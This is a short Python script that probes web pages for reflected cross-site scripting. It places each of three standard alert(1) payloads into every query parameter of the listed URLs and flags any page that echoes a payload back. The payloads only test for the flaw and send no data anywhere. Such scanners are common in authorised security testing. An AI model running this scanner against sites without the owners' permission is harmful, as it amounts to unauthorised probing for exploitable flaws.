import requests

PAYLOADS = [
    "<script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>"
]

def scan_xss(urls):
    print("[+] Scanning for XSS...")

    for url in urls:
        for payload in PAYLOADS:
            test_url = inject_payload(url, payload)

            try:
                res = requests.get(test_url, timeout=5)

                if payload in res.text:
                    print(f"\n[!!!] VULNERABLE: {test_url}")
                    print(f"[+] Payload: {payload}")

            except:
                pass


def inject_payload(url, payload):
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

    parsed = urlparse(url)
    qs = parse_qs(parsed.query)

    for key in qs:
        qs[key] = payload

    new_query = urlencode(qs, doseq=True)

    return urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        new_query,
        parsed.fragment
    ))
